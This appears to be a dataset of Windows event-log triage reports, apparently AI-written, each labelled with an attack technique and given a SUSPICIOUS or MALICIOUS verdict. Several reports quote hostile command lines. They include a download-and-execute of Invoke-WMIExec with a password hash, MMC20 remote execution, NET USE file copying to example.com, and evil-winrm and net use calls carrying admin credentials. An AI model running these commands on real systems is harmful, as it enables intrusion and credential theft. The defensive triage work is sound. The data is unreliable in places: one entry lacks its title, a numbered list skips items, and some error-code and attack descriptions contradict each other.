Enable Windows Remote Management,"Upon analyzing the provided event logs, here is an assessment of the suspicious or anomalous behavior observed:

### Suspicious Activity:
1. **PowerShell Command Execution**:
   - Multiple PowerShell events indicate the execution of `Enable-PSRemoting -Force`. This command is utilized to enable Windows PowerShell remoting, which might be benign in a controlled administrative context but could also be of concern if executed unexpectedly or by unauthorized users.

2. **Privilege Escalation**:
   - In the Security log, Event ID 4672 shows that the user `admin_test` was granted a list of privileges that include powerful permissions such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeLoadDriverPrivilege`. This is typical for an admin session but could be leveraged for malicious purposes if executed by an unauthorized user.

3. **Network-based Logon**:
   - Event ID 4624 with `LogonType: 3` indicates a network logon from an external source, which, in combination with the use of PowerShell and privileged user actions, warrants further investigation.

4. **Sysmon Logs for Process Execution**:
   - Multiple executions of administrative command-line utilities such as `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe` from the user `SERVER002\\admin_test`. The utilities like `wevtutil` and `hostname` being executed might indicate attempts to query system logs or gather host information.

### Benign Activities:
- **Windows Defender Update**:
  - System logs show the security intelligence update installations for Microsoft Defender (Event IDs: 44, 43, 19), which are expected under normal operations.

- **Routine System Operations**:
  - Processes like `wuauclt.exe` and scheduled updater processes for Microsoft Edge (`MicrosoftEdgeUpdate.exe`) are part of routine system operations and non-suspicious in normal circumstances.

### Assessment:
The combination of `Enable-PSRemoting` command via PowerShell, privileged account activities, and the network-based logon suggests potentially suspicious activities. However, if these actions were performed under a legitimate administrative context, they could be benign.

### Resolution:
- **SUSPICIOUS**: The logs contain suspicious activities that don't seem right and need more investigation. Specifically, the network log-on followed by remote PowerShell enabling and rights elevation needs authoritative validation to conclusively determine the nature of these activities.

### Guidance:
1. **Verify with Change Management**: Check if any recent changes or administrative activities were performed around the same time.
   
2. **Authenticate User Intent**: Validate with the user `admin_test` or responsible party whether these actions were authorized.

3. **Monitor Further Activities**: Set up additional monitoring on `SERVER002` for odd behaviors, PowerShell logs, and network connections to see if any further unusual activities occur.

4. **Validate Network Activities**: Use intrusion detection systems to review if similar activities are occurring across other systems which could indicate lateral movement attempts."
PowerShell Lateral Movement using MMC20,"Upon careful analysis of the provided Windows event logs, here are the key findings:

### Key Observations:

1. **PowerShell Logs:**
   - PowerShell events indicate the execution of a command that attempts to execute `calc.exe` (Windows Calculator) using a complex command line invoking the `MMC20.application` ProgID.
   - Command line: `[activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.application"",""localhost"")).Document.ActiveView.ExecuteShellCommand(""c:\\windows\\system32\\calc.exe"", $null, $null, ""7"")`

2. **Sysmon Logs:**
   - Multiple executions of system utilities like `wbem\\WmiPrvSE.exe`, `wevtutil.exe`, and `conhost.exe` under the `SERVER002\\admin_test` user.
   - Execution of Microsoft Edge and Windows Update-related processes such as `MicrosoftEdgeUpdate.exe`, `wuauclt.exe`, and `AM_Delta.exe`. These are indicative of legitimate software updates.
   - Importantly, the Sysmon log at `UtcTime=""2024-10-21 11:21:17.4160396""` shows `mmc.exe` and eventually `calc.exe` being executed under the context of `SERVER002\\admin_test`. This aligns with the PowerShell command observed, suggesting its execution was successful.

3. **Security Logs:**
   - The user `admin_test` has multiple entries indicating logon and special privileges assignment (Event ID 4672), indicating the user has high-level privileges such as `SeDebugPrivilege`, commonly associated with administrative tasks.

4. **System Logs:**
   - Appear to tie into regular Windows Update operations with relevant entries detailing antivirus updates.

### Analysis:

- **Suspicious Activity:**
  - The method used to launch `calc.exe` via a PowerShell script using `MMC20.application` is uncommon and can often be a sign of malicious activity where attackers attempt to execute payloads or establish persistence by using benign-looking commands.

- **Legitimate Activity:**
  - Activities related to Windows Update, Microsoft Edge updates, and system utility executions appear typical for system maintenance and software updates.

### Conclusion:
Given the unusual method used to launch a benign application (calc.exe) via PowerShell, coupled with high privileges of the executing user, this activity should be considered as:

- **Resolution: SUSPICIOUS**

### Recommendations:
1. **Further Investigation:**
   - Investigate the context and origin of the PowerShell command. Determine if it was an automated script or manually executed by the `admin_test` user.
   - Check if `calc.exe` execution was part of any legitimate administrative task or testing.

2. **Security Posture Assessment:**
   - Review permissions and activities of the `admin_test` user. Ensure least privilege principles are applied.
   - Monitor for similar future PowerShell command executions, especially if they use obfuscation or unusual invocation methods.

3. **Threat Hunting:**
   - Conduct a threat hunt focusing on abnormal User activities and PowerShell usage patterns to uncover any potential unauthorized access or compromises.

Proceeding with these steps will ensure the security of the system and clarify whether the activities are benign or tied to a potential compromise."
Exfiltration Over SMB over QUIC (NET USE),"After reviewing the provided Windows event logs, the following observations can be summarized:

### **Suspicious Behavior Observed:**

1. **PowerShell Execution:**
   - In the Sysmon and Windows PowerShell logs, there are events indicating the use of a PowerShell script to map a network drive using `NET USE` and then copy a file. The command is as follows:
     ```
     ""powershell.exe"" & {NET USE * '\\\\example.com\\sales' /TRANSPORT:QUIC /SKIPCERTCHECK, copy 'C:\\path\\to\\file.txt' '*:\\'}
     ```
   - The use of `/TRANSPORT:QUIC` and `/SKIPCERTCHECK` flags is unconventional and may bypass intended network configurations or security validations.
   - This specific use case, especially with copying files from or to network shares using PowerShell, can be associated with lateral movement or data exfiltration attempts.

2. **Sysmon Logs:**
   - Multiple invocations of system utilities such as `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `conhost.exe`. While these can be used in non-malicious contexts, their presence alongside suspicious PowerShell commands raises a concern about potential reconnaissance or privilege escalation activities.

3. **Network Connections:**
   - The security event logs show a change in the system time, which could be legitimate but may also be a tactic to manipulate logs or evade detection.

4. **Frequent Service Initiations:**
   - The Application and Sysmon logs display several service start and stop actions associated with the Microsoft Edge Update, which can be benign as part of regular update checks. However, if these events are frequent and clustered, they may indicate suspicious activity, particularly if unauthorized software installations or updates are being attempted.

### **Assessment:**
Considering the suspicious PowerShell command and its characteristics, as well as the network connection attempts and file operations it involves, there is reasonable cause to suspect this might be activity tied to malicious intent. The PowerShell scripting indicates potential unauthorized access or data theft attempts.

The findings lean towards identifying potential malware or a breach attempt, especially given the potential implications of the PowerShell command execution. 

### **Resolution: SUSPICIOUS**
The logs exhibit activity that is questionable, especially the PowerShell command execution involving network operations with potentially insecure options. This type of behavior is often associated with malicious operations, such as reconnaissance or lateral movement within a network environment.

### **Guidance on How to Proceed:**
1. **Immediate Investigation:**
   - Investigate the source and intent behind the specific PowerShell command.
   - Verify the authenticity and intent of network connections, particularly to `example.com`, which is often a placeholder and may not represent a legitimate or authorized resource.

2. **Containment Measures:**
   - Monitor and potentially restrict PowerShell scripting and execution policies to prevent unauthorized scripting activities.
   - Ensure the network shares and external sites are vetted and trusted.
   
3. **Intelligence Gathering:**
   - Check if similar patterns are seen across additional systems or logs, suggesting a broader scope of activity.
   
4. **Enhanced Monitoring:**
   - Implement additional logging and alerting around PowerShell and network activities.
   - Enable deeper analysis, possibly employing threat intelligence matching against known indicators of compromise (IOCs).
   
An additional, thorough incident investigation is warranted to accurately understand the risk and mitigate any threats posed by the observed activities."
Execute command writing output to local Admin Share,"### Analysis of Windows Event Logs

**System Logs:**
1. **Kernel-General & Time-Service Events:**
   - The logs indicate the system experienced changes in the system time (`EventID 1` & `EventID 24`). This could be related to legitimate activities such as daylight savings adjustments or manual changes. However, frequent or unexplained time changes could potentially be indicative of malicious activity or attempts to manipulate time-stamped logs to hide activities.

2. **WindowsUpdateClient Events:**
   - There are multiple events related to updates (`EventID 44`, `EventID 43`, `EventID 19`) for Microsoft Defender Antivirus. These logs seem to indicate regular update activities, which is normal behavior for maintaining system security.

**Security Logs:**
1. **Security Auditing (EventID 4616 & 5379):**
   - Event ID 4616 signifies that the system time was changed. It's important to verify if these changes were authorized or necessary.
   - The logon events reflect typical credential operations but involve `ReturnCode 3221226021`, associated with ""invalid parameter"". This appears to be a failed operation with potential user profile or session credentials areas, potentially due to a configuration issue.

**Sysmon Logs:**
1. **Frequent Execution of Common Windows Utilities:**
   - There is repeated activity involving utilities like `wevtutil.exe`, `conhost.exe`, and `HOSTNAME.EXE`. These could be part of normal administrative activities but also are often tools used in reconnaissance or setup phases of attacks.
   - The execution of `cmd.exe` with the command `""cmd.exe"" /c cmd.exe /Q /c hostname` is suspicious, especially redirecting output to `\\127.0.0.1\ADMIN$\output.txt`. This type of behavior could potentially be part of script automation or a step in lateral movement activities.
   - `whoami.exe` is executed, which retrieves username information likely for validating access or settings confirmatory identity checks by an adversary.

**Application Logs:**
1. **SecurityCenter Event:**
   - Logs indicate Windows Defender security product is active, suggesting antivirus applications are running, which is a positive security posture.

**Assessment and Conclusion:**
The logs highlight some potentially suspicious activities:
- **Time Alterations:** Multiple logs illustrate time changes which were not sufficiently explained in the logs. This could be a legitimate adjustment but should be verified.
- **Command Execution:** The invocation pattern of `cmd.exe` and the manipulation of common admin utilities (`wevtutil`, `conhost`) can be part of administrative tasks but could also indicate scripted or malicious operations if unauthorized or unexpected.
  
Given these findings, the resolution for this analysis is **SUSPICIOUS**. While there isn't definitive proof of malicious behavior, the combination of unexplained time changes and common administrative tool usage for redirecting command output merits a deeper investigation to validate whether these actions were legitimately performed by authorized personnel or possibly by an adversary attempting manipulation or exploration.

### Guidance and Next Steps:
- **Verification of Time Changes:** Interview system administrators and examine any associated task scheduler entries to validate legitimate adjustments.
  
- **Audit of Running Processes & Scripts:** Review additional logs and system scripts for any indications of automated or scripted activities, particularly those utilizing administrative tools.

- **User Access Check:** Ensure all invoked processes align with what `admin_test` should be performing. Trace back any unusual command executions to the user or service triggering these commands.

- **Review Access Control Lists (ACLs):** Ensure they are configured to prevent unnecessary or unauthorized access/imports.

- **Enable Monitoring Tools:** Consider implementing increased logging levels temporarily for deeper insight and monitoring of the server’s activities."
Rubeus Kerberos Pass The Ticket,"Upon analysis of the provided log entries, several indicators of potentially malicious activity have been identified:

1. **PowerShell Activity:**
   - A PowerShell script is executed that leverages **PsExec.exe** and **Rubeus.exe** for Kerberos ticket manipulation, specifically `asktgt` and `asktgs` commands. These tools and activities are often associated with attempted privilege escalation and lateral movement, commonly used for credential theft and unauthorized access attempts.

2. **PsExec Usage:**
   - The execution of **PsExec.exe** with the `-accepteula` indication and operation on **localhost** is suspicious. It is used to run processes on remote systems and can be utilized in a malicious context to execute code on other systems quietly.
   - The appearance of **PSEXESVC.exe** entries in the Sysmon and System logs suggests that PsExec service was installed and executed, aligning with known tactics for executing payloads remotely or configuring unauthorized services.

3. **Rubeus Tool:**
   - The usage of **Rubeus.exe** in the logs for interacting with tickets (`asktgt`, `asktgs`, and `purge`) is highly indicative of a Kerberos Ticket attack, suggesting an attempt to perform a Golden Ticket or Silver Ticket attack. This tool is popular in post-exploitation phases to escalate privileges or maintain persistence.

4. **User and Process Activity:**
   - The execution of scripts and potentially malicious PowerShell commands occur under the context of a presumably non-standard account, `admin_test`, suggesting potential misuse or compromise.
   - The host running these tools (`Server002`) exhibits multiple, rapid successive process creations primarily involving **conhost.exe** and **wevtutil.exe**, possibly indicating command line utilities being used in conjunction with the malicious scripts.

5. **Edge Update Processes:**
   - Though legitimate processes related to Microsoft's Edge Update are seen, their presence alongside other suspicious activities and the execution of several update components could be a potential cover or part of staging to introduce or hide illicit activity, though it is more likely routine.

Together, these points suggest activity consistent with threat actors attempting to advance persistent threats through credential abuse and lateral movement within a network. Therefore, the situational assessment based on these logs indicates a **MALICIOUS** classification.

**Guidance and Next Steps:**

- **Immediate Isolation:** Consider isolating `Server002` from the network to prevent further unauthorized access or data exfiltration.
- **Investigation:** Conduct a further, thorough investigation to trace the origin of the use of `PsExec.exe` and `Rubeus.exe`. Confirm if any unauthorized users or applications were installed or configured around the timestamps in question.
- **Credential and Access Review:** Initiate a comprehensive review of user accounts, especially `admin_test`, and passwords in use, recommending a potential reset of administrative credentials.
- **Monitoring and Detection:** Enhance monitoring for PsExec, Rubeus usage, and abnormal PowerShell command execution across the environment.
- **Security Audit:** Carry out an audit of network, host-based configurations, and critical system logs to identify and mitigate potential vulnerabilities exploited during this activity."
Remote Code Execution with PS Credentials Using Invoke-Command,"Upon reviewing the provided Windows event logs, several events stand out that deserve attention in determining the overall status of the system.

**1. Privilege Use and Logon Events:**
- EventID 4672: Indicates that the user 'admin_test' was assigned a series of special privileges, including SeDebugPrivilege, which is often monitored as it allows for process debugging—often a capability leveraged in post-exploitation stages of cyber incidents.
- EventID 4624: Shows several logons using NTLM authentication, including one by 'admin_test' from a remote workstation (DESKTOP-3HL5B2P). The usage of NTLM instead of more secure protocols like Kerberos, and the logon type 3 (network), suggests possible lateral movement activities.

**2. Anonymous Logon Events:**
- EventID 4624 & 4634: Events linking to ANONYMOUS LOGON sessions. While anonymous logons can occur naturally, they are frequently scrutinized for possible misuse in attacks such as pass-the-hash or anonymous service access.

**3. PowerShell Activity:**
- Events show PowerShell activity executing ""Enable-PSRemoting -Force"" and running commands remotely on the computer. PowerShell remoting is legitimate but can be malicious if initiated without explicit administrative approval or unexpected schedules. It is often used by attackers to control and manage remote systems stealthily.

**4. Process Execution (Sysmon Logs):**
- Multiple instances of the use of ""wevtutil.exe,"" a legitimate tool for event log manipulation, are noted. While not inherently malicious, it can be used to clear logs or evade detection.
- Suspicious looking command ""whoami"" being executed, typically used for post-exploit activities to confirm the effectiveness of a privilege escalation.
  
**5. Routine Updates and Application Logs:**
- Windows Defender updates and Microsoft Edge update processes are shown. These seem to be normal operations within the system log.

**Assessment:**
- While many events identified are likely benign when viewed independently, the combination of NTLM logons, special privilege assignments, anonymous logons, and unusual PowerShell activity collectively raises the suspicion level.

**Conclusion:**
- **Resolution: SUSPICIOUS**

**Guidance on Next Steps:**
- Conduct a deeper investigation into the context and origin of the anonymous logons, including any lateral connections originating from or targeting DESKTOP-3HL5B2P.
- Review the administrative access logs to validate if 'admin_test' was expected to execute high-privilege actions during the time in question.
- Verify if the PowerShell scripts were authorized and investigate the context of their execution.
- Consider implementing more stringent monitoring and alerting on events involving NTLM logons, especially from remote workstations. 
- Assess the potential need for system hardening and restrict unnecessary remote and script execution capabilities to mitigate potential exploitation opportunities in the future."
Disable NLA for RDP via Command Prompt,"Based on the analysis of the provided event logs, here are the findings:

### **Suspicious or Anomalous Behavior**
- **Time Change Events:** There are several instances of time rollback, where the system time was set backwards. For example, the OldTime ""2024-10-21 11:01:45.0110853"" was changed to NewTime ""2024-10-21 11:01:25.2160117"". This is commonly seen when malware or attackers try to confuse log timelines or expiration of their presence.
- **Privilege Assignment (Event ID 4672):** The user ""admin_test"" was granted a variety of privileges that are typically sensitive and used for administrative purposes (e.g., SeDebugPrivilege, SeTakeOwnershipPrivilege). This could be an indication of privilege escalation or misuse of privileges.
- **Unusual Registry Modification:** There is a record showing command line execution (cmd.exe with /c reg add) that modifies the registry key related to Remote Desktop Protocol (RDP) authentication settings. This action, initiated by ""admin_test"", can disable security features and is often indicative of malicious behavior aiming to facilitate unauthorized access.
- **Multiple Instances of Event ID 5379:** This event seems related to failed operations to access user credentials or tokens, which could be part of an attempt to sabotage or exploit credential usage.

### **Indicators of Malicious Activity**
- **Execution of System Utilities:** Multiple instances of system utilities such as wevtutil.exe, conhost.exe, hostname.exe, and whoami.exe executed by ""admin_test"" might hint at reconnaissance or attempts to manipulate logs and determine current user context.
- **Registry Modification and High Integrity Commands:** The manipulation of the registry with high integrity suggests an attempt to alter system configurations, potentially to lower defense mechanisms or enhance persistence capabilities.

### **Assessment**
The evidence collected from the logs indicates suspicious activities consistent with privilege escalation attempts, unauthorized modifications to system configurations related to RDP, and manipulation of system time likely to avoid detection or disrupt regular monitoring.

### **Threats or Risks Identified**
- **Potential Compromise of System Security:** The set of activities, especially altering registry settings for RDP, implies a clear risk of unauthorized remote access.
- **Privilege Escalation:** The assignment of significant privileges to a user account suggests an escalated risk of malicious exploitation.
- **Data/log tampering or manipulation** efforts as suggested by multiple system tool executions and time change events.

### **Resolution**
**Resolution:** SUSPICIOUS
- The activities detected do not confirm an active compromise but present a substantial indication of potentially malicious behavior that requires further investigation.

In conclusion, while definitive malicious activity isn't explicitly confirmed, the logs warrant further investigation to ensure system integrity and security."
crackmapexec Pass the Hash,"Upon analyzing the provided Windows event logs, several findings suggest potentially suspicious and malicious activities:

1. **Time Manipulation:**
   - Event ID 4616 in the Security log indicates a change in the system time, which is typically benign but could be used as part of a tactic to alter logged timestamps, evade detection, or interfere with time-dependent security controls. This activity coinciding with privilege changes raises suspicion.

2. **Privileged Logon and Privilege Escalation:**
   - Event ID 4672 logs a special privileges logon by the user `admin_test`. The privileges included are highly sensitive: `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, among others. Such privileges can be leveraged for unauthorized access or escalation of privileges, suggesting potentially risky behavior if not justified by legitimate administrative activity.

3. **Potential Indicators of Credential Compromise:**
   - Event ID 4624 indicates a successful network logon for the user `admin_test` from `DESKTOP-3HL5B2P`. This is noteworthy given the use of NTLM authentication, which is known for susceptibility to credential relay attacks if passwords or hashes are stolen.

4. **Command Execution via Cmd.exe and CrackMapExec:**
   - Sysmon log shows execution of `cmd.exe` with CrackMapExec (`crackmapexec.exe`) suggesting credential theft attempts or lateral movement within the network. The usage of `CrackMapExec` is a known post-exploitation tool utilized for SMB reconnaissance and exploitation, aligning with suspicious behavior.

5. **Excessive Use of Administrative Tools:**
   - Multiple uses of `whoami.exe`, `hostname.exe`, and `wevtutil.exe` by the `admin_test` account suggest an attempt to collect system information, potentially in preparation for further exploitation.

6. **Unusual PowerShell Execution:**
   - There are references to PowerShell execution (though not detailed in this log submission), which requires attention since PowerShell is a powerful tool often used by attackers for code execution.

Given these findings, the behavior reflected in the logs points toward **MALICIOUS** activity due to the combination of privilege escalation without clear justification, abnormal access patterns, and use of known exploit tools like CrackMapExec. The following steps are recommended:

- **Immediate Action:**
  - Isolate the affected system to prevent further movement or data exfiltration.
  - Reset credentials, particularly for the `admin_test` account and any potentially compromised accounts.
  - Perform a detailed forensic analysis of the system, focusing on PowerShell executions and file changes around the logged times.

- **Follow-Up Actions:**
  - Review and tighten user access controls and revoke unnecessary privileges.
  - Ensure all authentication methods are secure, transitioning away from NTLM where possible.
  - Conduct a broader network analysis to identify other potentially compromised systems.

The assessment concludes high-risk malicious activity that requires immediate response and post-incident analysis."
WinRM Access with Evil-WinRM,"### Detailed Analysis of Event Logs

#### Security Log Analysis

1. **Event ID 5379**:
   - These entries are related to attempts at accessing credentials, potentially for a Microsoft account, which resulted in a failed operation with a `ReturnCode` of `3221226021`. This code typically indicates an access denied error.
   - These repeated failed attempts could suggest either a misconfiguration or a potential automated attack trying to access credential information. However, no credentials were returned.

2. **Event ID 4624 and 4672**:
   - These indicate successful logons using the SYSTEM account with high privileges, which are standard for system operations. The presence of such events in isolation without further context may not be directly indicative of malicious activity unless paired with unexpected behavior or processes.
   - Privilege escalation privileges were granted (Event ID 4672), which is common for SYSTEM accounts and hence not unusual unless appearing out of context.

#### Sysmon Log Analysis

1. **Sysmon Event ID 5** and **Event ID 1**:
   - There are several entries for the execution of `powershell.exe`, `wevtutil.exe`, and other system utilities (`conhost.exe`, `wsqmcons.exe`) by `SERVER002\admin_test`.
   - Notably, the PowerShell command executed includes `evil-winrm`, which is a known penetration testing tool often used for unauthorized remote access in a Windows environment. This is a definite indicator of potentially malicious activity by the `admin_test` user.
   - The use of such a tool to run a command with parameters targeting a domain administrator account (`evil-winrm -i Target -u Domain\\Administrator -p P@ssw0rd1`) aligns with privilege escalation intentions and unauthorized access attempts.

#### PowerShell Log Analysis

1. **PowerShell Event ID 600 and 400 Series**:
   - These logs further confirm the execution of PowerShell with the `evil-winrm` tool. The sequence of events suggests potentially malicious use of PowerShell to conduct lateral movement or elevate privileges.

### Assessment and Conclusion

There are significant indicators of unauthorized activities, primarily around the use of `evil-winrm` in conjunction with other legitimate administrative tools like `wevtutil.exe`. Specifically, the execution of `evil-winrm` for potentially unauthorized remote access raises considerable red flags.

### Resolution: **MALICIOUS**

#### Recommendations:
- **Immediate Quarantine**: The affected Windows host should be quarantined to prevent further potential internal attacks or data exfiltration.
- **User Account Review**: Review all actions and permissions associated with the `SERVER002\admin_test` account to determine the extent of the potential compromise.

Invoke-WMIExec Pass the Hash,"**Analysis of Windows Event Logs:**

### Suspicious Behavior Detected:
1. **Unusual PowerShell Activity:**
   - There is a Sysmon Event ID 1 detailing the execution of `powershell.exe` with a suspicious command line:
     ```
     ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12, IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target $env:COMPUTERNAME -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname}
     ```
   - This command fetches a script from an external URL and attempts to execute it, which is indicative of potentially malicious behavior. The script `Invoke-WMIExec.ps1` is known for being used in lateral movement attacks.

2. **Process Execution Patterns:**
   - There is a frequent pattern of `wevtutil.exe` and `conhost.exe` being executed multiple times within a short period. While these binaries themselves are legitimate, their usage can be abused for evasion or data capture depending on the context.
   - A timeframe where multiple utilities being executed in parallel (`wevtutil.exe`, `hostname.exe`, and `whoami.exe`) is observed. This can be part of enumeration or information gathering by an adversary.

3. **Time Change Events:**
   - The system time was altered (Event ID 4616 in Security log), which could suggest an attempt to change event time logs for obfuscation and misalign potential forensic investigation timelines.

### Malicious Assessment:
- **PowerShell Script Execution:** The PowerShell command points to an attempt to execute a potentially harmful script directly from a remote repository. The script could be utilized for credential dumping or executing commands on a remote host which are common tactics in attacks.

### Resolution:
- **Resolution: MALICIOUS**
  - The detected PowerShell activity with remote script execution confirms malicious intent, as it can lead to remote code execution or further compromise within the network.

### Recommended Actions:
1. **Network Monitoring:** Analyze outbound connections to identify unauthorized or unusual network traffic patterns.
2. **Immediate Isolation:** Consider isolating 'Server002' to contain any potential further propagation of malicious activity.

5. **Update Security Controls:** Ensure all endpoint protections are updated, including signatures in Windows Defender and any third-party security solutions.
6. **User Awareness:** Inform the administrative team on suspicious activity and potential phishing attempts.

By executing these measures, the IT and Security teams can reduce the impact and potentially prevent wider network compromise."
Map admin share,"Upon analyzing the provided Windows event logs, several key details stand out:

### System Log:
- Logs show that a Security Intelligence Update for Microsoft Defender Antivirus was successfully applied, as evidenced by EventIDs 44, 43, and 19. This indicates that the machine is up-to-date with its antivirus signatures and does not immediately indicate any malicious activity.

### Sysmon Log:
- Multiple logs reflect the execution of system processes (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`) by the user `SERVER002\admin_test`. These are generally legitimate system operations, often related to viewing event logs (`wevtutil`) and console operations.
- Noteworthy Execution: 
  - `cmd.exe` used with a command to establish a network connection using potentially sensitive credentials: `net use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator`. This operation is suspicious as it involves connecting to another machine with administrative privileges.
  
### Application Log:
- Reflects Windows Defender is turned on with an EventID of 15, indicating that the machine's built-in antivirus is active and operational, which is a good security posture.

### Security Log:
- A login attempt by user `admin_test` with NTLM authentication was successful with EventID 4624. Privileges included a variety of high-level permissions (`SeDebugPrivilege`, `SeBackupPrivilege`, among others) as seen in EventID 4672, which is common for administrative users but can be dangerous if misused.

### Assessment:
- **Suspicious Activity Detected:** The use of the command `net use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator` is the most notable suspicious activity. Such actions could indicate an attempt at lateral movement within a network or unauthorized access to another system, especially if undocumented or unexpected.
- **No immediate evidence** of malware or system compromise beyond this potentially unauthorized network mapping attempt. Other logs, involving the execution of system tools, seem benign provided they align with normal administrative activities.

### Guidance:
1. **Further Investigation Needed**:
   - Validate whether the `net use` command was authorized or intended as part of regular operations. Review change management logs or speak to administrators to confirm legitimacy.
   - Inspect the target machine for any unauthorized access logs or anomalies around the time of the connection.
   
2. **Enhance Monitoring**:
   - Increase logging and monitoring around sensitive account usage and network commands execution.
   - Consider implementing stricter Just-In-Time (JIT) privilege escalation policies to reduce unnecessary high-privilege access.

### Final Resolution: **SUSPICIOUS**
The detected activity involving credential use for network access is suspicious and warrants further investigation to rule out any malicious intent or unauthorized access."

### Key Observations:
1. **Microsoft Edge Update Activity**:
   - A significant portion of logs relates to Microsoft Edge Update processes, such as `MicrosoftEdgeUpdate.exe`. This is associated with legitimate software updates for Microsoft Edge.
   - The processes are executed under the `NT AUTHORITY\SYSTEM` user, which is normal for updates being conducted by system-level services.
   - Commands executed, such as `/update`, `/regserver`, and `/svc`, are consistent with routine update operations.

2. **PowerShell and Wevtutil Usage**:
   - There are entries indicating the execution of `powershell.exe` and `wevtutil.exe` with the user `SERVER002\admin_test`.
   - The use of `wevtutil.exe` may suggest log manipulation or querying, which can be legitimate but can also involve suspicious activity if unauthorized.

3. **Command Prompt Activity**:
   - The `cmd.exe` process invoking Radmin Viewer is of concern, especially running from the temporary directory. Radmin is a remote administration tool, and its unauthorized use could indicate malicious intent, such as remote control or surveillance activities.
   - This setup could potentially suggest an attempt to gain unauthorized access or control over the system.

4. **Process Creation Entries**:
   - Multiple entries pertain to `conhost.exe`, which commonly runs alongside command prompt activities, suggesting benign interactions in response to executed commands.

5. **Other System Processes**:
   - Processes like `whoami.exe`, `hostname.exe`, `TiWorker.exe`, `TrustedInstaller.exe`, and `WmiPrvSE.exe` are noted. These are standard Windows processes, the presence of which in isolation doesn't warrant immediate concern without associated suspicious activity.

### Conclusion:
While the majority of activities captured in the Windows Event Logs appear to be consistent with system updates and standard processes, the manner of usage of Radmin Viewer, particularly from a temporary file path, and prior engagement of PowerShell and Windows event utility (wevtutil) command by a user account, without further context, stand out and could potentially indicate a setup for unauthorized remote access or log tampering.

### Resolution:
Overall, based on the current analysis, the conclusion is:

- **SUSPICIOUS** - The activities involving `Radmin Viewer` and the `wevtutil.exe` suggest there might be signs of potential misuse or configuration aiming for unauthorized access or hidden operations, warranting further investigation to conclusively determine intentions or validate if unauthorized users are exploiting system capabilities.

### Recommended Actions:
1. **Validate User Actions**: Verify actions of `SERVER002\admin_test` account to ascertain if they conform to expected usage patterns.
2. **Check Remote Administration Tool Usage**: Investigate the use of Radmin Viewer—determine if authorized and whether its configuration is genuine.
3. **Review Access and Authorization**: Ensure there is no unauthorized escalation of privileges or unsanctioned remote access being set up.
4. **Enhance Monitoring and Alerts**: Increase logging and alerting, specifically around remote access tools and command-line utilities to detect potentially unauthorized access early.
5. **Comprehensive Security Audit**: Conduct an audit of recent administrative tasks to check for anomalies in administrative actions or unauthorized access attempts."
Map Admin Share PowerShell,"### Analysis

The analysis of the provided Windows event logs reveals some behaviors that could be considered suspicious, warranting further investigation:

1. **Time Change Anomalies**:
   - The logs show that the system time was changed (Event ID 1 under Kernel-General, and Event ID 4616 under Security). Legitimate reasons for time changes include daylight saving adjustments or synchronization with a time server. However, changes occurring frequently and in close sequence can be a tactic used to confuse log timelines during malicious activity.

2. **Unusual PowerShell Activity**:
   - There are PowerShell events indicating the use of the `New-PSDrive` command to map a network drive (specifically a root of `\\Target\\C$`). This could be benign if the activity is expected within the environment, often done by system administrators for legitimate purposes. However, it can also be a method for lateral movement if performed by unauthorized personnel.

3. **Privileges Assigned to User `admin_test`**:
   - The security audit logs show multiple Event ID 4672 entries indicating special privileges were assigned to the user `admin_test`. While typical if the user is a system administrator, it's important to verify that these actions align with expected behavior for this account.

4. **Frequent Use of `wevtutil.exe` and `conhost.exe`**:
   - The Sysmon logs show repeated executions of `wevtutil.exe` and `conhost.exe`. `wevtutil.exe` is a legitimate Windows utility tool used to query logs but can also be used to clear event logs, potentially covering tracks. Similarly, `conhost.exe` is used to manage console windows, but frequent appearances with no obvious context can indicate abuse.

5. **Remote Logins**:
   - The security logs (Event ID 4624) show logon types indicating remote network logins. While typical in remote management scenarios, it’s crucial to ensure these actions are expected for the user `admin_test`.

6. **Defender and Windows Update Activities**:
   - Updating Microsoft Defender (KB2267602) and general system updates (through `wuauclt.exe`) appear as regular updates, usually benign. However, ensuring that updates originate from trusted sources is always a best practice.

### Assessment of Situation

The logs reveal several activities that could be considered common in normal operations when performed by system administrators. However, some of these activities, such as time changes, mapping network drives via PowerShell, and remote logins paired with elevated privileges, can simultaneously align with tactics used during malicious activities.

### Threats/Risks Identified
- Potential time manipulation for covering tracks.
- Potential unauthorized lateral movement within the network.
  
### Guidance on How to Proceed
1. **Further Investigation of User `admin_test`**:
   - Verify the authenticity and recent activities associated with the `admin_test` account.
   - Check if these actions conform to the routine tasks for this user.

2. **Review Network and System Integrations**:
   - Ensure that the PowerShell command aligns with legitimate administrative tasks.
   - Check for any unexpected network connections from or to `\\Target\\C$`.

3. **Investigate the Source of Time Changes**:
   - Determine if these changes are scheduled or manual, validate with NTP service configurations.

4. **Verify Update Sources**:
   - Confirm that the logged updates are expected and from authorized sources or schedules.

### Resolution
Given the analysis and identified activities, this situation should be categorized as:
- **SUSPICIOUS** - The logs contain activities that need further investigation to confirm whether they align with routine or potentially unauthorized actions."
Exfiltration Over SMB over QUIC (New-SmbMapping),"Based on the analysis of the provided Windows event logs:

1. **Sysmon Logs**:
   - Repeated execution of `wevtutil.exe` and `conhost.exe` by the user ""admin_test"" may suggest some level of command-line or script automation or routine checks related to event log management. The `wevtutil.exe` process is a standard Windows utility for managing event logs. However, it doesn’t show any specific suspicious command line arguments in the logs.
   - The execution of `whoami.exe` and `hostname.exe` by ""admin_test"" is typically benign unless combined with other suspicious activities for reconnaissance.
   - The execution of `powershell.exe` with the command `New-SmbMapping` using the parameter `-SkipCertificateCheck` could be suspicious if it were attempting to map network drives in an unusual manner or to bypass standard checks.

2. **Security Logs**:
   - The time change event, logged under Event ID 4616, by the ""LOCAL SERVICE"" using `svchost.exe`, which changed the system time, is noteworthy. However, time adjustments can happen due to synchronization with time servers without being outright malicious.

3. **PowerShell Logs**:
